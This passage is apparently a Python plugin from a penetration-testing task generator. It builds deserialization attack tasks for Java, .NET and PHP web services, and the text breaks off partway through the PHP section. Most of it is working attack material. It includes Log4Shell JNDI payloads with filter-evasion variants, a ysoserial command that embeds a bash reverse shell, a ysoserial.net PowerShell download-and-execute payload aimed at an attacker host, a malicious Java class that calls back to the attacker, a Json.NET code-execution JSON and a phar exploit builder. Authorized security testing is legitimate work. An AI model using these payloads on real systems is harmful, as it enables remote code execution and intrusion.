"""
Deserialization Attacks service plugin

Generates tasks for testing insecure deserialization vulnerabilities across
multiple languages and frameworks:
- Java (ysoserial, JNDI, Log4Shell, JSF ViewState, SignedObject)
- .NET (ObjectDataProvider, ViewState, BinaryFormatter, Json.NET)
- PHP (Advanced object injection, phar://, autoload exploitation)
- Python (YAML deserialization comprehensive testing)
- Ruby (Marshal deserialization, JSON pollution)

IMPORTANT: This plugin detects web services and generates deserialization tests.
Duplicates avoided: Basic Python pickle (python_web.py), basic PHP unserialize (php.py),
basic Java RMI (java_app_servers.py)

Extracted from HackTricks: pentesting-web/deserialization/
Generated by: CrackPot v1.0
"""

from typing import Dict, Any, List
from .base import ServicePlugin
from .registry import ServiceRegistry


@ServiceRegistry.register
class DeserializationAttacksPlugin(ServicePlugin):
    """Advanced deserialization attack testing plugin"""

    @property
    def name(self) -> str:
        return "deserialization-attacks"

    @property
    def default_ports(self) -> List[int]:
        return [80, 443, 8080, 8443, 8000, 8008, 8888, 9090, 3000, 5000]

    @property
    def service_names(self) -> List[str]:
        return ['http', 'https', 'http-proxy', 'ssl/http', 'http-alt', 'websocket']

    def detect(self, port_info: Dict[str, Any]) -> bool:
        """Detect HTTP/web services for deserialization testing"""
        service = port_info.get('service', '').lower()
        port = port_info.get('port')
        product = port_info.get('product', '').lower()

        # Check service name
        if any(svc in service for svc in self.service_names):
            return True

        # Check common HTTP ports
        if port in self.default_ports:
            return True

        # Check product indicators
        if any(keyword in product for keyword in ['tomcat', 'jetty', 'wildfly', 'weblogic', 'jboss',
                                                   'iis', 'asp.net', 'kestrel']):
            return True

        return False

    def get_task_tree(self, target: str, port: int, service_info: Dict[str, Any]) -> Dict[str, Any]:
        """Generate deserialization attack testing task tree"""
        product = service_info.get('product', '')
        version = service_info.get('version', '')

        # Determine technology stack from product/service
        is_java = any(keyword in product.lower() for keyword in ['tomcat', 'jetty', 'wildfly', 'jboss', 'weblogic'])
        is_dotnet = any(keyword in product.lower() for keyword in ['iis', 'asp.net', 'kestrel'])
        is_php = 'php' in product.lower()

        tasks = {
            'id': f'deserial-attacks-{port}',
            'name': f'Deserialization Attacks (Port {port})',
            'type': 'parent',
            'children': []
        }

        # === JAVA DESERIALIZATION ===
        if is_java or not (is_dotnet or is_php):  # Default include Java for unknown stacks
            tasks['children'].append(self._create_java_deserial_tasks(target, port, product, version))

        # === .NET DESERIALIZATION ===
        if is_dotnet or not (is_java or is_php):  # Default include .NET for unknown stacks
            tasks['children'].append(self._create_dotnet_deserial_tasks(target, port, product, version))

        # === PHP ADVANCED DESERIALIZATION ===
        if is_php or not (is_java or is_dotnet):  # Default include PHP
            tasks['children'].append(self._create_php_advanced_deserial_tasks(target, port))

        # === PYTHON YAML DESERIALIZATION ===
        # Include for all web apps (Python frameworks common)
        tasks['children'].append(self._create_python_yaml_tasks(target, port))

        # === RUBY DESERIALIZATION ===
        tasks['children'].append(self._create_ruby_deserial_tasks(target, port))

        # === GENERIC DETECTION ===
        tasks['children'].append(self._create_generic_detection_tasks(target, port))

        return tasks

    def _create_java_deserial_tasks(self, target: str, port: int, product: str, version: str) -> Dict[str, Any]:
        """Create Java deserialization attack tasks"""
        protocol = 'https' if port in [443, 8443] else 'http'

        return {
            'id': f'java-deserial-{port}',
            'name': 'Java Deserialization Attacks',
            'type': 'parent',
            'children': [
                # TASK 1: Log4Shell (CVE-2021-44228)
                {
                    'id': f'log4shell-test-{port}',
                    'name': 'Log4Shell (CVE-2021-44228) Detection',
                    'type': 'command',
                    'metadata': {
                        'command': f'curl -H "User-Agent: ${{jndi:ldap://YOUR-COLLAB-SERVER/a}}" {protocol}://{target}:{port}/',
                        'description': 'Test for Log4Shell vulnerability in log4j (RCE via JNDI injection)',
                        'tags': ['OSCP:HIGH', 'QUICK_WIN', 'EXPLOIT', 'CVE'],
                        'flag_explanations': {
                            '-H': 'Add HTTP header (User-Agent is commonly logged)',
                            'User-Agent': 'Header sent to server (logged by log4j)',
                            '${jndi:ldap://...}': 'Log4j JNDI lookup syntax - triggers LDAP callback',
                            'YOUR-COLLAB-SERVER': 'Replace with Burp Collaborator, interact.sh, or canarytokens.org'
                        },
                        'success_indicators': [
                            'DNS/LDAP request received on your collaborator server',
                            'Callback contains hostname, environment variables',
                            'Version 2.0-beta9 to 2.14.1 confirmed vulnerable'
                        ],
                        'failure_indicators': [
                            'No callback received (patched or not using log4j)',
                            'WAF blocks payload (try obfuscation)',
                            'Application error (syntax issue)'
                        ],
                        'next_steps': [
                            'If callback received, test RCE with JNDI exploit server',
                            'Try all injectable parameters (headers, POST data, cookies)',
                            'Test obfuscation: ${${::-j}${::-n}${::-d}${::-i}:...}',
                            'Use Huntress scanner: curl ${jndi:ldap://log4shell.huntress.com:1389/...}'
                        ],
                        'alternatives': [
                            'Test with canarytokens: ${jndi:ldap://x${hostName}.L4J.TOKEN.canarytokens.com/a}',
                            'Use interactsh: ${jndi:ldap://RANDOM.interact.sh}',
                            'Burp Suite Collaborator: ${jndi:ldap://RANDOM.burpcollaborator.net}',
                            'dnslog.cn: ${jndi:ldap://2j4ayo.dnslog.cn}',
                            'Manual LDAP server: marshalsec or JNDI-Exploit-Kit'
                        ],
                        'notes': '''Log4Shell allows RCE via JNDI injection in log4j versions 2.0-beta9 to 2.14.1.

**Exploitation Steps:**
1. Setup LDAP server with malicious JNDI Reference (marshalsec, JNDI-Exploit-Kit)
2. Host malicious Java class on HTTP server
3. Inject ${jndi:ldap://attacker:1389/Exploit} in logged data
4. Target queries LDAP, downloads and executes your class

**Bypass 2.15 (CVE-2021-45046):**
${jndi:ldap://127.0.0.1#attacker.com/a}

**Obfuscation techniques:**
- ${${::-j}ndi:ldap://...}
- ${jndi:${lower:l}${lower:d}ap://...}
- ${${env:ENV_NAME:-j}ndi:ldap://...}

**Tools:**
- marshalsec: LDAP server for JNDI exploitation
- JNDI-Exploit-Kit: All-in-one exploit framework
- ysoserial: Generate Java deserialization gadgets
- log4shell-detector: Automated scanner

**CVE Variants:**
- CVE-2021-44228: Original Log4Shell (2.0-2.14.1)
- CVE-2021-45046: Incomplete fix bypass (2.15.0)
- CVE-2021-45105: DoS in 2.16.0
- CVE-2021-44832: RCE via JDBCAppender config (2.17.0)
''',
                        'estimated_time': '5-10 minutes'
                    }
                },

                # TASK 2: Ysoserial gadget testing
                {
                    'id': f'ysoserial-test-{port}',
                    'name': 'Java Deserialization with Ysoserial',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'ysoserial-detect-{port}',
                            'name': 'Detect Java serialized objects',
                            'type': 'manual',
                            'metadata': {
                                'description': 'Search for Java serialization magic bytes in HTTP traffic',
                                'notes': '''**Java serialization signatures:**

**Base64 encoded:**
- rO0AB (hex AC ED 00 05 in base64)
- Starts with "rO0" in cookies, parameters, POST data

**Raw hex:**
- AC ED 00 05 (serialization stream magic)

**Where to look:**
- Cookies (JSESSIONID, SESSION, remember-me)
- POST parameters (especially named "data", "object", "payload")
- ViewState (.NET and JSF both use serialization)
- URL parameters (less common)
- File uploads (deserialize after upload)

**Detection commands:**
echo "COOKIE_VALUE" | base64 -d | xxd | head
grep -r "rO0AB" burp_history/
strings capture.pcap | grep "rO0AB"
''',
                                'alternatives': [
                                    'Burp Suite: Passive Scanner detects Java serialization',
                                    'GadgetProbe: DNS-based gadget detection tool',
                                    'Freddy: Burp extension for active deserialization testing',
                                    'ysoserial: Test with URLDNS gadget (no code execution, only DNS callback)'
                                ],
                                'tags': ['OSCP:HIGH', 'MANUAL', 'RECON']
                            }
                        },
                        {
                            'id': f'ysoserial-rce-{port}',
                            'name': 'Generate RCE payload with ysoserial',
                            'type': 'command',
                            'metadata': {
                                'command': f'java -jar ysoserial.jar CommonsCollections6 \'bash -i >& /dev/tcp/{target}/4444 0>&1\' | base64 -w0',
                                'description': 'Generate Java deserialization RCE payload with common gadget chain',
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'AUTOMATED'],
                                'flag_explanations': {
                                    'java -jar ysoserial.jar': 'Run ysoserial gadget generator',
                                    'CommonsCollections6': 'Gadget chain targeting Apache Commons Collections',
                                    'bash -i >& /dev/tcp/...': 'Reverse shell command to execute',
                                    'base64 -w0': 'Base64 encode for injection (no line wrapping)'
                                },
                                'success_indicators': [
                                    'Base64 payload generated successfully',
                                    'Reverse shell connection received on attacker listener',
                                    'Command executed on target (verify with whoami, id)'
                                ],
                                'failure_indicators': [
                                    'ClassNotFoundException (gadget library not in classpath)',
                                    'No execution (input not deserialized)',
                                    'Exception thrown (wrong gadget for target Java version)'
                                ],
                                'next_steps': [
                                    'Start listener: nc -lvnp 4444',
                                    'Inject payload into parameter/cookie with serialized object',
                                    'URL encode base64 payload if injecting via URL',
                                    'Try different gadget chains if CommonsCollections6 fails',
                                    'Check target Java version: try Groovy1, Jdk7u21, Spring1'
                                ],
                                'alternatives': [
                                    'CommonsCollections1-7: Most common gadget chains',
                                    'Groovy1: Groovy library exploitation',
                                    'Spring1, Spring2: Spring framework gadgets',
                                    'Jdk7u21: Pure JDK gadget (no external libs)',
                                    'URLDNS: DNS exfiltration (no RCE, for detection only)',
                                    'Manual: ysoserial-modified for custom payloads'
                                ],
                                'notes': '''Ysoserial generates malicious Java serialized objects using gadget chains.

**Popular Gadget Chains:**

1. **CommonsCollections1-7** (Most common)
   - Requires: Apache Commons Collections 3.1-3.2.1
   - Best: CommonsCollections6 (works with 3.1-3.2.1)

2. **Groovy1**
   - Requires: Groovy 2.3.0-2.4.3
   - Works on many Java apps

3. **Spring1, Spring2**
   - Requires: Spring Framework
   - Common in enterprise Java apps

4. **Jdk7u21**
   - Pure JDK gadget (no dependencies)
   - Works if target is vulnerable Java version

5. **URLDNS**
   - Detection only (triggers DNS lookup)
   - Works on ALL Java versions
   - No code execution

**Testing Workflow:**
1. Find serialized object (AC ED 00 05 or base64 rO0AB)
2. Test with URLDNS + Burp Collaborator (safe detection)
3. If vulnerable, generate RCE payload with gadget chain
4. Try multiple gadgets until one works
5. Deliver reverse shell or execute commands

**Tools:**
- ysoserial: Main gadget generator
- GadgetProbe: DNS-based detection
- SerialKiller: Java deserialization firewall
- JexBoss: JBoss exploitation (includes deserial)
- marshalsec: Research tool for gadget chains

**Common Injection Points:**
- Cookies (JSESSIONID, remember-me)
- POST parameters (data, object, payload)
- ViewState (JSF applications)
- JMX endpoints (JBoss, WebLogic)
- RMI services (port 1099)
''',
                                'estimated_time': '15-30 minutes (testing multiple gadgets)'
                            }
                        },
                        {
                            'id': f'jsf-viewstate-{port}',
                            'name': 'JSF ViewState Deserialization',
                            'type': 'command',
                            'metadata': {
                                'command': f'python3 ysoserial_exploit.py --target {protocol}://{target}:{port}/page.jsf --gadget CommonsCollections6 --cmd "whoami"',
                                'description': 'Exploit JSF ViewState deserialization vulnerability',
                                'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'JAVA'],
                                'flag_explanations': {
                                    '--target': 'Target JSF application URL',
                                    '--gadget': 'Ysoserial gadget chain to use',
                                    '--cmd': 'Command to execute on target'
                                },
                                'success_indicators': [
                                    'ViewState found in response (javax.faces.ViewState)',
                                    'Command execution confirmed',
                                    'JSF error messages revealing deserialization'
                                ],
                                'failure_indicators': [
                                    'ViewState not found (not JSF app)',
                                    'ViewState encrypted or signed',
                                    'Gadget chain not available'
                                ],
                                'next_steps': [
                                    'Extract ViewState from HTML forms',
                                    'Decode ViewState (base64)',
                                    'Check for encryption/signing',
                                    'Generate malicious ViewState with ysoserial',
                                    'Submit via POST request'
                                ],
                                'alternatives': [
                                    'Manual: Extract and decode ViewState with burp',
                                    'ysoserial.jar: java -jar ysoserial.jar CommonsCollections6 "cmd" | base64',
                                    'Check for .faces, .jsf, .xhtml extensions',
                                    'Replay requests with modified ViewState'
                                ],
                                'notes': '''JSF (JavaServer Faces) ViewState stores server-side state in serialized form.

**ViewState Location:**
Hidden field: <input type="hidden" name="javax.faces.ViewState" value="..." />

**Exploitation:**
1. Identify JSF app (.faces, .jsf, .xhtml URLs)
2. Extract ViewState from form
3. Check if serialized Java object (starts with rO0AB in base64)
4. Generate malicious ViewState with ysoserial
5. Replace ViewState in POST request
6. Submit form

**Tools:**
- ysoserial: Payload generation
- Burp Suite: Intercept and modify ViewState
- ViewState Decoder: Online tools available

**Note:** Modern JSF encrypts/signs ViewState, making exploitation difficult.
Check web.xml for javax.faces.STATE_SAVING_METHOD = "server" (vulnerable) vs "client" (less likely).
''',
                                'estimated_time': '20-40 minutes'
                            }
                        }
                    ]
                },

                # TASK 3: JNDI Injection
                {
                    'id': f'jndi-injection-{port}',
                    'name': 'JNDI Injection Testing',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'jndi-ldap-test-{port}',
                            'name': 'JNDI LDAP Injection',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -X POST {protocol}://{target}:{port}/api/lookup -d "name=${{jndi:ldap://YOUR-SERVER:1389/Exploit}}"',
                                'description': 'Test JNDI LDAP injection for remote class loading',
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'JAVA'],
                                'flag_explanations': {
                                    '-X POST': 'HTTP POST request',
                                    '-d': 'POST data payload',
                                    '${jndi:ldap://...}': 'JNDI lookup expression (triggers remote object loading)',
                                    'YOUR-SERVER:1389': 'Your malicious LDAP server',
                                    '/Exploit': 'Reference to malicious Java class'
                                },
                                'success_indicators': [
                                    'LDAP connection to your server',
                                    'HTTP request for malicious .class file',
                                    'Code execution confirmed'
                                ],
                                'failure_indicators': [
                                    'No callback (not vulnerable or patched)',
                                    'trustURLCodebase=false (Java security settings)',
                                    'Security Manager blocking remote class loading'
                                ],
                                'next_steps': [
                                    'Setup LDAP server: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://YOUR-IP:8000/#Exploit',
                                    'Host malicious class: python3 -m http.server 8000',
                                    'Generate exploit class: javac Exploit.java (Runtime.exec payload)',
                                    'Inject JNDI expression in all input fields'
                                ],
                                'alternatives': [
                                    'RMI injection: ${jndi:rmi://attacker:1099/Exploit}',
                                    'CORBA injection: ${jndi:iiop://attacker:1050/Exploit}',
                                    'DNS injection: ${jndi:dns://attacker/Exploit}',
                                    'JNDI-Exploit-Kit: Automated exploitation framework',
                                    'marshalsec: JNDI exploit server'
                                ],
                                'notes': '''JNDI allows Java apps to lookup objects from remote sources (LDAP, RMI, DNS).

**Exploitation Flow:**
1. Setup malicious LDAP server (marshalsec)
2. Host malicious Java .class file (HTTP server)
3. Inject ${jndi:ldap://attacker:1389/Exploit} in vulnerable parameter
4. Target connects to your LDAP server
5. LDAP server returns JNDI Reference to HTTP server
6. Target downloads and executes your .class file = RCE

**Java Security Settings (JDK versions):**
- JDK 6u141, 7u131, 8u121+: com.sun.jndi.ldap.object.trustURLCodebase=false (patched)
- JDK 7u21+: java.rmi.server.useCodebaseOnly=true (patched)
- To exploit patched versions: abuse existing classpath gadgets

**Exploit Example (Exploit.java):**
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("curl http://attacker/pwned");
        } catch (Exception e) {}
    }
}

Compile: javac Exploit.java
Serve: python3 -m http.server 8000
LDAP: java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer http://YOUR-IP:8000/#Exploit

**Common Vulnerable Apps:**
- Log4j (Log4Shell)
- Spring Framework
- Fastjson
- Jackson (JSON libraries)
- Any app calling InitialContext.lookup() with user input
''',
                                'estimated_time': '30-45 minutes'
                            }
                        }
                    ]
                },

                # TASK 4: Java SignedObject bypass
                {
                    'id': f'signedobject-bypass-{port}',
                    'name': 'Java SignedObject Gated Deserialization',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit SignedObject to bypass deserialization filters',
                        'tags': ['OSCP:LOW', 'ADVANCED', 'RESEARCH'],
                        'notes': '''SignedObject wraps and signs serialized objects. It's sometimes used as "gated deserialization" to bypass filters.

**Concept:**
- App implements deserialization filter (whitelist/blacklist)
- Filter allows SignedObject.class
- SignedObject contains nested malicious serialized object
- Nested object deserialized AFTER passing filter

**Exploitation:**
1. Generate malicious payload: ysoserial.jar CommonsCollections6 "cmd"
2. Wrap in SignedObject (requires key signing)
3. Inject wrapped object
4. SignedObject passes filter, then deserializes inner payload

**Limitations:**
- Requires knowing or guessing signing key
- SignedObject must be in filter whitelist
- Not all apps use gated deserialization

**Tools:**
- ysoserial SignedObjectGadget (if available)
- Manual Java code to wrap payloads

**Research:**
- Check for ObjectInputStream.setObjectInputFilter()
- Identify whitelist classes
- Test if SignedObject bypasses filter
''',
                        'alternatives': [
                            'Test other wrapper classes: java.rmi.MarshalledObject',
                            'Abuse allowed classes for side effects',
                            'DNS exfiltration via URLDNS gadget'
                        ]
                    }
                }
            ]
        }

    def _create_dotnet_deserial_tasks(self, target: str, port: int, product: str, version: str) -> Dict[str, Any]:
        """.NET deserialization attacks"""
        protocol = 'https' if port in [443, 8443] else 'http'

        return {
            'id': f'dotnet-deserial-{port}',
            'name': '.NET Deserialization Attacks',
            'type': 'parent',
            'children': [
                # TASK 1: ViewState exploitation
                {
                    'id': f'viewstate-exploit-{port}',
                    'name': 'ASP.NET ViewState Deserialization',
                    'type': 'parent',
                    'children': [
                        {
                            'id': f'viewstate-detect-{port}',
                            'name': 'Detect and decode ViewState',
                            'type': 'command',
                            'metadata': {
                                'command': f'curl -s {protocol}://{target}:{port}/ | grep -oP "__VIEWSTATE.*?value=\\"\\K[^\\"]*"',
                                'description': 'Extract ViewState from ASP.NET application',
                                'tags': ['OSCP:HIGH', 'QUICK_WIN', 'RECON'],
                                'flag_explanations': {
                                    '-s': 'Silent mode (no progress bar)',
                                    'grep -oP': 'Perl regex for precise extraction',
                                    '__VIEWSTATE': 'Hidden field containing serialized state',
                                    'value="\\K[^"]*"': 'Extract value between quotes'
                                },
                                'success_indicators': [
                                    'Base64 ViewState extracted',
                                    'ViewState present on page',
                                    'ASP.NET application confirmed'
                                ],
                                'failure_indicators': [
                                    'No __VIEWSTATE field found (not ASP.NET)',
                                    'ViewState encrypted (harder to exploit)',
                                    'Empty ViewState'
                                ],
                                'next_steps': [
                                    'Decode ViewState: echo "VIEWSTATE" | base64 -d | xxd',
                                    'Check if encrypted (random bytes vs structured data)',
                                    'Use ViewState decoder: https://viewstate-decoder.azurewebsites.net/',
                                    'Identify .NET version from decoded data',
                                    'Look for machineKey in web.config exposure'
                                ],
                                'alternatives': [
                                    'Burp Suite: ViewState Editor extension',
                                    'Manual: View page source, find __VIEWSTATE field',
                                    'ViewState decoder tools online',
                                    'ysoserial.net: Generate malicious ViewState'
                                ],
                                'notes': '''ASP.NET ViewState stores page state in serialized format.

**ViewState Structure:**
<input type="hidden" name="__VIEWSTATE" value="BASE64_DATA" />

**Exploitation Scenarios:**

1. **ViewState MAC disabled** (EnableViewStateMac=false in web.config)
   - Can tamper without key
   - Inject ObjectDataProvider gadget
   - Generate with ysoserial.net

2. **ViewState MAC enabled but key known**
   - Need machineKey from web.config
   - Generate with ysoserial.net --validationkey --decryptionalg

3. **ViewState encrypted**
   - Need machineKey (validationKey + decryptionKey)
   - Harder to exploit

**Detection:**
- ASP.NET indicators: .aspx extensions, __VIEWSTATE field
- Check for machineKey exposure: /web.config, /.git/
- Test if MAC validation disabled
''',
                                'estimated_time': '5-10 minutes'
                            }
                        },
                        {
                            'id': f'viewstate-rce-{port}',
                            'name': 'ViewState RCE with ysoserial.net',
                            'type': 'command',
                            'metadata': {
                                'command': f'ysoserial.exe -p ViewState -g ObjectDataProvider -c "powershell -enc BASE64_PAYLOAD" --generator="RANDOM_STRING"',
                                'description': 'Generate malicious ViewState for RCE via ObjectDataProvider gadget',
                                'tags': ['OSCP:HIGH', 'EXPLOIT', 'DOTNET'],
                                'flag_explanations': {
                                    '-p ViewState': 'Target ASP.NET ViewState plugin',
                                    '-g ObjectDataProvider': 'Gadget chain for code execution',
                                    '-c': 'Command to execute',
                                    'powershell -enc': 'Execute base64-encoded PowerShell',
                                    '--generator': 'ViewState generator value (default if unknown)'
                                },
                                'success_indicators': [
                                    'Malicious ViewState generated',
                                    'Command executed on target',
                                    'Reverse shell received'
                                ],
                                'failure_indicators': [
                                    'MAC validation error (need correct machineKey)',
                                    'Encryption error (need decryption key)',
                                    'Gadget not available (.NET version mismatch)'
                                ],
                                'next_steps': [
                                    'If MAC enabled: Add --validationkey="KEY" --validationalg="SHA1"',
                                    'If encrypted: Add --decryptionkey="KEY" --decryptionalg="AES"',
                                    'Inject generated ViewState in POST request',
                                    'Trigger postback (click button, submit form)',
                                    'Catch reverse shell on listener'
                                ],
                                'alternatives': [
                                    'TypeConfuseDelegate gadget: Alternative to ObjectDataProvider',
                                    'Manual: Craft .NET serialized object with BinaryFormatter',
                                    'BlackList3r: Automated ViewState exploitation tool',
                                    'ViewGen: GUI tool for ViewState generation'
                                ],
                                'notes': '''ViewState exploitation with ysoserial.net.

**Full Exploitation Example:**

1. **Check if MAC disabled:**
   - Tamper ViewState, submit form
   - If no error = MAC disabled (easy exploit)

2. **If MAC enabled, find machineKey:**
   - Check web.config exposure
   - Check version control exposure (.git, .svn)
   - Brute force if short key
   - Use default keys for older IIS

3. **Generate payload:**
   ```
   # MAC disabled
   ysoserial.exe -p ViewState -g ObjectDataProvider -c "cmd /c ping attacker.com"

   # MAC enabled
   ysoserial.exe -p ViewState -g ObjectDataProvider \\
     -c "powershell IEX(New-Object Net.WebClient).DownloadString('http://attacker/shell.ps1')" \\
     --validationkey="ABCD..." --validationalg="SHA1" \\
     --decryptionkey="1234..." --decryptionalg="AES"
   ```

4. **Inject ViewState:**
   - Intercept POST request in Burp
   - Replace __VIEWSTATE value
   - Submit form

**machineKey format (web.config):**
<machineKey validationKey="..." decryptionKey="..." validation="SHA1" decryption="AES" />

**Common machineKey locations:**
- /web.config
- /.git/HEAD (if git repo exposed)
- Error messages (misconfigurations)
- Default keys (IIS 7.0 and earlier)

**Tools:**
- ysoserial.net: Payload generator
- BlackList3r: Automated testing
- ViewState decoder: Analysis tool
''',
                                'estimated_time': '20-45 minutes'
                            }
                        }
                    ]
                },

                # TASK 2: BinaryFormatter exploitation
                {
                    'id': f'binaryformatter-{port}',
                    'name': 'BinaryFormatter Deserialization',
                    'type': 'command',
                    'metadata': {
                        'command': f'ysoserial.exe -f BinaryFormatter -g ObjectDataProvider -c "calc.exe" -o base64',
                        'description': 'Generate BinaryFormatter deserialization payload for .NET',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'DOTNET'],
                        'flag_explanations': {
                            '-f BinaryFormatter': 'Target .NET BinaryFormatter serialization',
                            '-g ObjectDataProvider': 'Gadget for code execution',
                            '-c "calc.exe"': 'Command to execute',
                            '-o base64': 'Output format (base64 for injection)'
                        },
                        'success_indicators': [
                            'Base64 payload generated',
                            'Code executed on target',
                            'No deserialization errors'
                        ],
                        'failure_indicators': [
                            'Deserialization filter active',
                            'Type not allowed',
                            'No BinaryFormatter deserialization'
                        ],
                        'next_steps': [
                            'Inject in cookie, POST parameter, or API endpoint',
                            'Try different gadgets if ObjectDataProvider blocked',
                            'Test TypeConfuseDelegate gadget',
                            'Check for .NET Remoting endpoints (TCP 8080-9000)'
                        ],
                        'alternatives': [
                            'TypeConfuseDelegate: Alternative gadget',
                            'Json.NET: If app uses Newtonsoft.Json',
                            'Manual: Craft with System.Runtime.Serialization',
                            'ExploitRemotingService: .NET Remoting exploitation'
                        ],
                        'notes': '''BinaryFormatter is .NET's binary serialization format.

**Common Injection Points:**
- Cookies (especially authentication tokens)
- API POST data (application/octet-stream)
- .NET Remoting endpoints
- WCF services
- File uploads (deserialize after upload)

**Signature:**
- Raw: 00 01 00 00 00 FF FF FF FF 01 00 00 00 00 00 00 00 ...
- Base64: AAEAAAD/////AQAAAAAAAAAA...

**Gadget Chains:**
1. ObjectDataProvider: Most reliable
2. TypeConfuseDelegate: Alternative if ODP blocked
3. PSObject: If PowerShell assemblies loaded
4. ClaimsIdentity: Windows Identity Foundation

**Detection:**
Look for BinaryFormatter usage in .NET apps:
- Cookie values starting with "AAEAAAD"
- application/octet-stream POST requests
- .NET Remoting (TCP high ports)

**Microsoft Warning:**
BinaryFormatter is insecure and deprecated. Microsoft recommends NOT using it.
Presence = high likelihood of RCE.
''',
                        'estimated_time': '15-30 minutes'
                    }
                },

                # TASK 3: Json.NET exploitation
                {
                    'id': f'jsonnet-exploit-{port}',
                    'name': 'Json.NET (Newtonsoft) Deserialization',
                    'type': 'command',
                    'metadata': {
                        'command': f'ysoserial.exe -f Json.Net -g ObjectDataProvider -c "cmd /c whoami" -o raw',
                        'description': 'Exploit Json.NET deserialization with type handling',
                        'tags': ['OSCP:HIGH', 'EXPLOIT', 'DOTNET'],
                        'flag_explanations': {
                            '-f Json.Net': 'Target Newtonsoft.Json library',
                            '-g ObjectDataProvider': 'Gadget chain for RCE',
                            '-c': 'Command to execute',
                            '-o raw': 'Output as JSON string'
                        },
                        'success_indicators': [
                            'JSON payload generated',
                            'Command executed',
                            '$type field accepted by server'
                        ],
                        'failure_indicators': [
                            'Type not resolved (TypeNameHandling not enabled)',
                            'Type loading restricted',
                            'Json.NET not used'
                        ],
                        'next_steps': [
                            'Inject $type field in JSON POST data',
                            'Test if TypeNameHandling=All or Objects',
                            'Try different gadgets if blocked',
                            'Escalate to reverse shell'
                        ],
                        'alternatives': [
                            'Manual JSON with $type: {"$type":"System.Windows.Data.ObjectDataProvider..."}',
                            'ExpandedWrapper: Wrap ObjectDataProvider for DotNetNuke',
                            'YamlDotNet: If YAML deserialization used instead',
                            'FastJson: If FastJson library used'
                        ],
                        'notes': '''Json.NET (Newtonsoft.Json) is vulnerable when TypeNameHandling is enabled.

**Vulnerable Configuration:**
JsonConvert.DeserializeObject<T>(json, new JsonSerializerSettings {
    TypeNameHandling = TypeNameHandling.All  // VULNERABLE
});

**Exploitation:**
Send JSON with $type field:
{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "MethodParameters": {
    "$type": "System.Collections.ArrayList",
    "$values": ["cmd", "/c calc"]
  },
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process"
  }
}

**Detection:**
- Test with $type in JSON: {"$type":"System.Object", "test":"value"}
- If accepted: TypeNameHandling enabled
- Check API responses for $type fields

**TypeNameHandling Levels:**
- None: Safe (default)
- Objects: Vulnerable (allows $type in objects)
- Arrays: Vulnerable (allows $type in arrays)
- All: Extremely vulnerable
- Auto: Vulnerable in some contexts

**Microsoft Advisory:**
TypeNameHandling should always be None unless absolutely necessary.
Presence = critical vulnerability.
''',
                        'estimated_time': '10-20 minutes'
                    }
                }
            ]
        }

    def _create_php_advanced_deserial_tasks(self, target: str, port: int) -> Dict[str, Any]:
        """Advanced PHP deserialization (beyond basic unserialize)"""
        protocol = 'https' if port in [443, 8443] else 'http'

        return {
            'id': f'php-advanced-deserial-{port}',
            'name': 'PHP Advanced Deserialization',
            'type': 'parent',
            'children': [
                # TASK 1: Phar deserialization
                {
                    'id': f'phar-deserial-{port}',
                    'name': 'Phar:// Deserialization Attack',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit PHP phar:// stream wrapper for deserialization',
                        'tags': ['OSCP:MEDIUM', 'EXPLOIT', 'PHP'],
                        'notes': '''Phar archives contain metadata that's automatically unserialized when accessed via phar:// wrapper.

**Vulnerability:**
Any file operation on phar:// triggers unserialize():
- file_get_contents("phar://evil.phar")
- file_exists("phar://evil.phar/test")
- is_dir("phar://evil.phar")
- filesize, fopen, readfile, etc.

**Exploitation Steps:**

1. **Create malicious phar:**
```php
<?php
class Evil {
    function __destruct() {
        system($this->cmd);
    }
}
$evil = new Evil();
$evil->cmd = "id";

$phar = new Phar("evil.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($evil);  // Serialized object here
$phar->addFromString("test.txt", "content");
$phar->stopBuffering();
?>
```

2. **Upload evil.phar** (rename to .jpg, .png to bypass filters)

3. **Trigger deserialization:**
   - Parameter: ?file=phar://uploads/evil.jpg/test.txt
   - LFI: ?page=phar://evil.jpg
   - File operation: fopen($_GET['file'], 'r')

**Detection:**
- Find file operation functions in code
- Test phar:// in file parameters
- Check if file upload available

**Bypass Techniques:**
- Rename phar to .jpg (magic bytes still valid)
- Polyglot phar/jpg (combine formats)
- Compress: phar://compress.zlib://evil.phar
- GIF89a header for GIF bypass

**Common Injection Points:**
- File upload + LFI
- Image processing functions
- XML parsing with external entities
- Any file operation on user input
''',
                        'success_indicators': [
                            'Phar metadata unserialized',
                            'Magic method triggered (__destruct, __wakeup)',
                            'Code execution achieved'
                        ],
                        'failure_indicators': [
                            'Phar:// wrapper disabled (phar.readonly=1)',
                            'File operation does not trigger unserialize',
                            'Insufficient gadget chains in app'
                        ],
                        'next_steps': [
                            'Generate phar with gadget chain (phpggc)',
                            'Upload phar disguised as image',
                            'Trigger via file operation function',
                            'Use polyglot phar/jpg for filter bypass'
                        ],
                        'alternatives': [
                            'phpggc -p phar -o evil.phar Monolog/RCE1 system id',
                            'PHPGGC: Library of ready-made gadget chains',
                            'Manual: Craft phar with application-specific gadgets',
                            'Polyglot: Combine phar with valid image'
                        ],
                        'estimated_time': '30-60 minutes'
                    }
                },

                # TASK 2: Autoload exploitation
                {
                    'id': f'php-autoload-deserial-{port}',
                    'name': 'PHP Autoload + Deserialization',
                    'type': 'manual',
                    'metadata': {
                        'description': 'Exploit spl_autoload_register with deserialization for LFI/RCE',
                        'tags': ['OSCP:MEDIUM', 'ADVANCED', 'PHP'],
                        'notes': '''Combine deserialization with autoload to load arbitrary files and classes.

**Vulnerability Pattern:**
```php
spl_autoload_register(function ($name) {
    if (preg_match('/_/', $name)) {
        $name = preg_replace('/_/', '/', $name);  // tmp_passwd â†’ /tmp/passwd
    }
    $filename = "/${name}.php";
    if (file_exists($filename)) {
